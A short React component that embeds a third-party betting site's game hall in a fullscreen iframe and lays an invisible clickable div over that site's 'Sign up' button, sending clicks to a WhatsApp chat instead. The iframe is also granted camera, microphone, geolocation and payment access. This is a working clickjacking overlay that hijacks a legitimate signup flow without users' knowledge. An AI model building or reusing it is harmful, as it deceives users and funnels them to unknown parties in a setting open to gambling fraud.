import { useState, useEffect } from 'react'
import './App.css'

const TARGET_URL = 'https://www.skyexch.art/#/gameHall'
const WHATSAPP_SIGNUP_URL =
  'https://api.whatsapp.com/send/?phone=123456789&text&type=phone_number&app_absent=0'

export default function App() {
  const [isLoading, setIsLoading] = useState<boolean>(true)

  // Auto-dismiss loading screen quickly so black screen never stays
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false)
    }, 1000)
    return () => clearTimeout(timer)
  }, [])

  const handleOriginalSignUpClick = () => {
    window.open(WHATSAPP_SIGNUP_URL, '_blank', 'noopener,noreferrer')
  }

  return (
    <div className="app-container">
      {/* 100% Invisible click overlay directly covering the original 'Sign up' button */}
      <div
        className="original-signup-overlay"
        onClick={handleOriginalSignUpClick}
        title="Sign Up"
        role="button"
        tabIndex={0}
      />

      {/* Loading Overlay */}
      {isLoading && (
        <div className="loading-overlay">
          <div className="spinner"></div>
          <p className="loading-text">Loading...</p>
        </div>
      )}

      {/* Fullscreen Embedded Game Hall */}
      <iframe
        src={TARGET_URL}
        title="SkyExch Game Hall"
        className="portal-frame"
        referrerPolicy="no-referrer"
        allow="fullscreen; clipboard-write; encrypted-media; picture-in-picture; payment; autoplay; camera; microphone; geolocation; storage-access; web-share"
        onLoad={() => setIsLoading(false)}
      />
    </div>
  )
}
